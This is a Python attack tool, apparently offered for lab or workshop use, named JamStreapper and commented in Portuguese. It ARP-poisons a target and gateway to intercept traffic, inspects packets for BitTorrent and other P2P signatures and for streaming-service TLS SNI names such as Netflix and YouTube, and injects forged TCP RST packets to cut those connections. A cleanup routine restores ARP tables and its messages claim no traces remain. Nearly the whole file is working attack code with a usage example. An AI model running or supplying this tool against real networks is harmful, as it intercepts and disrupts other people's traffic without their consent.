#!/usr/bin/env python3
"""
JamStreapper v1.0 - Professional DPI & Network Jamming Tool

LICENSE: MIT License
Copyright (c) 2024 ArkanIA Security Lab

AVISO DE RESPONSABILIDADE:
Este software foi desenvolvido exclusivamente para fins de laboratório, testes de 
segurança e educação. O autor não se responsabiliza por qualquer uso indevido 
ou danos causados por esta ferramenta. A utilização em redes de terceiros sem 
autorização prévia é ilegal e de total responsabilidade do utilizador.

Author: Kleber Tiko aka Nightwolf
"""

import argparse
import os
import sys
import time
import threading
import signal
import logging
from scapy.all import *
from scapy.layers.tls.all import TLS, TLS_Ext_ServerName
from rich.console import Console
from rich.logging import RichHandler
from rich.panel import Panel
from art import tprint

# Configuração da consola visual para um look profissional
console = Console()
logging.basicConfig(
    level="INFO", 
    format="%(message)s", 
    handlers=[RichHandler(show_time=False, markup=True)]
)
log = logging.getLogger("rich")

class JamStreapper:
    def __init__(self, interface, target_ip, gateway_ip):
        self.interface = interface
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.is_running = True
        
        # Assinaturas de Deep Packet Inspection (DPI)
        # Identificamos protocolos pela sua "assinatura digital" no payload
        self.signatures = {
            "P2P": [
                b"BitTorrent protocol", 
                b"get_peers", 
                b"d1:ad2:id20:", 
                b"announce_peer",
                b"info_hash",
                b"peer_id",
                b"\x13BitTorrent",
                b"d1:rd2:id20:",
                b"eMule",
                b"eD2k",
                b"DC++",
                b"Gnutella",
                b"KAD",
                b"Kademlia"
            ],
            "STREAM": [
                "netflix", 
                "spotify", 
                "amazon", 
                "stremio", 
                "twitch", 
                "disney", 
                "hbo",
                "youtube",
                "primevideo",
                "hulu",
                "crunchyroll",
                "dazn",
                "paramount",
                "peacock",
                "apple",
                "max.com",
                "pluto",
                "tubi",
                "vimeo",
                "dailymotion",
                "video",
                "stream"
            ]
        }

    def get_mac(self, ip):
        """
        Descobre o endereço MAC de um IP na rede local através de um ARP Request.
        Fundamental para que o envenenamento (Spoofing) seja direcionado ao hardware correto.
        """
        try:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), 
                         timeout=3, iface=self.interface, verbose=False)
            if ans:
                return ans[0][1].hwsrc
        except Exception as e:
            log.error(f"[bold red]Erro ao obter MAC de {ip}: {e}[/]")
        return None

    def capture_demo(self, pkt, service_type, detail):
        """
        Demonstração visual da captura de pacotes para o Workshop.
        Exibe um painel com detalhes técnicos e dump hexadecimal do payload.
        """
        panel_text = f"[bold green]INTERCEPTADO:[/] [bold white]{service_type}[/]\n"
        panel_text += f"[bold cyan]ORIGEM:[/] {pkt[IP].src} -> [bold cyan]DESTINO:[/] {pkt[IP].dst}\n"
        panel_text += f"[bold yellow]DETALHE:[/] {detail}\n"
        
        if pkt.haslayer(Raw):
            # Exibe os primeiros 32 bytes em formato hexadecimal (estilo Hacker/Wireshark)
            try:
                hex_data = hexdump(pkt[Raw].load[:32], dump=True)
                panel_text += f"\n[dim]{hex_data}[/]"
            except:
                panel_text += f"\n[dim]Payload: {len(pkt[Raw].load)} bytes[/]"
            
        console.print(Panel(panel_text, border_style="red", title="[bold white]DPI ALERT[/]"))

    def inject_rst(self, pkt):
        """
        Ataque de TCP Reset. Injeta um pacote com a flag 'R' (Reset) na ligação.
        Isto força o sistema operativo do alvo a fechar o socket imediatamente.
        """
        try:
            if pkt.haslayer(TCP) and pkt.haslayer(IP):
                # Forjamos o pacote: IP de origem é o destino real, e o destino é o nosso alvo
                ip_layer = IP(src=pkt[IP].dst, dst=pkt[IP].src)
                tcp_layer = TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, 
                               flags="R", seq=pkt[TCP].ack, ack=pkt[TCP].seq + 1)
                send(ip_layer/tcp_layer, verbose=False, iface=self.interface)
                
                # RST na direção oposta também
                ip_layer_rev = IP(src=pkt[IP].src, dst=pkt[IP].dst)
                tcp_layer_rev = TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport, 
                                   flags="R", seq=pkt[TCP].seq, ack=pkt[TCP].ack)
                send(ip_layer_rev/tcp_layer_rev, verbose=False, iface=self.interface)
        except Exception as e:
            log.warning(f"[yellow]Aviso ao injetar RST: {e}[/]")

    def dpi_engine(self, pkt):
        """
        Motor de Inspeção Profunda de Pacotes.
        Analisa cada pacote capturado via MITM em busca de assinaturas proibidas.
        """
        try:
            if not pkt.haslayer(IP) or not pkt.haslayer(TCP):
                return

            # 1. Inspeção de Dados Brutos (P2P/Torrent)
            if pkt.haslayer(Raw):
                load = pkt[Raw].load
                for sig in self.signatures["P2P"]:
                    if sig in load:
                        self.capture_demo(pkt, "PROTOCOLO P2P", f"Assinatura Detectada: {sig[:20]}")
                        self.inject_rst(pkt)
                        return

            # 2. Inspeção de TLS/HTTPS (Streaming via SNI)
            # O SNI revela o domínio antes da cifra começar
            if pkt.haslayer(TLS):
                try:
                    tls_layer = pkt[TLS]
                    # Procura por extensões TLS
                    while tls_layer:
                        if hasattr(tls_layer, 'msg') and tls_layer.msg:
                            for msg in tls_layer.msg:
                                if hasattr(msg, 'ext') and msg.ext:
                                    for ext in msg.ext:
                                        if isinstance(ext, TLS_Ext_ServerName):
                                            if hasattr(ext, 'servernames'):
                                                for server in ext.servernames:
                                                    if hasattr(server, 'servername'):
                                                        host = server.servername.decode() if isinstance(server.servername, bytes) else str(server.servername)
                                                        for stream_sig in self.signatures["STREAM"]:
                                                            if stream_sig.lower() in host.lower():
                                                                self.capture_demo(pkt, "SERVIÇO DE STREAMING", f"Domínio: {host}")
                                                                self.inject_rst(pkt)
                                                                return
                        tls_layer = tls_layer.payload if hasattr(tls_layer, 'payload') else None
                except Exception as e:
                    pass  # TLS parsing pode falhar em alguns casos

        except Exception as e:
            pass  # Ignora erros de parsing para não quebrar o fluxo

    def mitm_loop(self):
        """
        Ciclo de Man-in-the-Middle. Mantém o envenenamento ARP ativo.
        Sem isto, os pacotes não passariam pela nossa máquina.
        """
        log.info("[bold cyan]Resolvendo endereços MAC da rede...[/]")
        t_mac = self.get_mac(self.target_ip)
        g_mac = self.get_mac(self.gateway_ip)

        if not t_mac or not g_mac:
            log.error("[bold red][!] Erro crítico: Não foi possível resolver endereços MAC na rede.")
            log.error("[bold red]Verifique se os IPs estão corretos e acessíveis na rede local.[/]")
            os.kill(os.getpid(), signal.SIGINT)
            return

        log.info(f"[green]Target MAC: {t_mac}[/]")
        log.info(f"[green]Gateway MAC: {g_mac}[/]")
        log.info("[bold green][+] ARP Poisoning iniciado com sucesso![/]")

        while self.is_running:
            try:
                # Dizemos ao Alvo que NÓS somos o Gateway
                send(ARP(op=2, pdst=self.target_ip, hwdst=t_mac, psrc=self.gateway_ip), 
                     verbose=False, iface=self.interface)
                # Dizemos ao Gateway que NÓS somos o Alvo
                send(ARP(op=2, pdst=self.gateway_ip, hwdst=g_mac, psrc=self.target_ip), 
                     verbose=False, iface=self.interface)
                time.sleep(2)  # Intervalo para não saturar a rede mas manter o envenenamento
            except Exception as e:
                if self.is_running:
                    log.error(f"[red]Erro no MITM loop: {e}[/]")

    def ghost_cleanup(self, sig, frame):
        """
        Protocolo de Limpeza: Desativa o forwarding e restaura as tabelas ARP originais.
        Garante que não deixamos a rede "partida" após o ataque.
        """
        self.is_running = False
        console.print("\n[bold yellow][!] Iniciando Protocolo de Limpeza (Ghost Mode)...[/]")
        
        # Desativa o encaminhamento de IP no Kernel
        try:
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
            log.info("[yellow][-] IP Forwarding desativado[/]")
        except:
            pass
        
        # ARP Healing: Devolve os MACs corretos aos donos legítimos
        t_mac = self.get_mac(self.target_ip)
        g_mac = self.get_mac(self.gateway_ip)
        
        if t_mac and g_mac:
            log.info("[cyan]Restaurando tabelas ARP...[/]")
            # Enviamos pacotes ARP reais múltiplas vezes para limpar o cache das vítimas
            try:
                send(ARP(op=2, pdst=self.target_ip, hwdst="ff:ff:ff:ff:ff:ff", 
                         psrc=self.gateway_ip, hwsrc=g_mac), count=7, verbose=False, iface=self.interface)
                send(ARP(op=2, pdst=self.gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", 
                         psrc=self.target_ip, hwsrc=t_mac), count=7, verbose=False, iface=self.interface)
            except Exception as e:
                log.warning(f"[yellow]Aviso durante ARP healing: {e}[/]")
            
        console.print("[bold green][✓] Rede restaurada. Histórico limpo. Workshop concluído.[/]")
        sys.exit(0)

    def run(self):
        """Ponto de entrada principal da ferramenta"""
        console.clear()
        tprint("JamStreapper", font="cybermedium")
        console.print(Panel(
            f"[bold cyan]ALVO:[/] {self.target_ip}\n"
            f"[bold cyan]GATEWAY:[/] {self.gateway_ip}\n"
            f"[bold cyan]IFACE:[/] {self.interface}\n"
            f"[bold magenta]P2P Signatures:[/] {len(self.signatures['P2P'])}\n"
            f"[bold magenta]Stream Signatures:[/] {len(self.signatures['STREAM'])}", 
            title="[bold red]HACKER LAB MODE[/]",
            subtitle="Deep Packet Inspection Engine v1.1"
        ))
        
        # Ativa o IP Forwarding para permitir que o tráfego legítimo passe por nós
        try:
            os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
            log.info("[green][+] IP Forwarding ativado[/]")
        except Exception as e:
            log.error(f"[red]Erro ao ativar IP Forwarding: {e}[/]")
            sys.exit(1)

        # Inicia o MITM em background (Thread dedicada)
        mitm_thread = threading.Thread(target=self.mitm_loop, daemon=True)
        mitm_thread.start()
        
        time.sleep(3)  # Aguarda o MITM estabelecer-se
        
        log.info("[bold yellow]⚡ A aguardar tráfego para interceptação ativa...[/]")
        log.info("[dim]Pressione Ctrl+C para parar e limpar a rede[/]\n")
        
        try:
            # Inicia a captura e análise em tempo real
            sniff(iface=self.interface, prn=self.dpi_engine, store=0)
        except Exception as e:
            log.error(f"[red]Erro durante captura: {e}[/]")
            self.ghost_cleanup(None, None)

if __name__ == "__main__":
    # Verifica privilégios root
    if os.geteuid() != 0:
        console.print("[bold red][!] Este script requer privilégios root (sudo)![/]")
        sys.exit(1)
    
    parser = argparse.ArgumentParser(
        description="JamStreapper v1.1 - Professional DPI Tool",
        epilog="Exemplo: sudo python3 jamstreapper.py -i wlan0 -t 192.168.1.50 -g 192.168.1.1"
    )
    parser.add_argument("-i", "--interface", required=True, help="Interface de rede (ex: wlan0, eth0)")
    parser.add_argument("-t", "--target", required=True, help="IP do Alvo")
    parser.add_argument("-g", "--gateway", required=True, help="IP do Gateway/Router")
    
    args = parser.parse_args()
    
    jammer = JamStreapper(args.interface, args.target, args.gateway)
    
    # Captura o sinal de Ctrl+C para uma saída limpa e sem rastos
    signal.signal(signal.SIGINT, jammer.ghost_cleanup)
    signal.signal(signal.SIGTERM, jammer.ghost_cleanup)
    
    jammer.run()
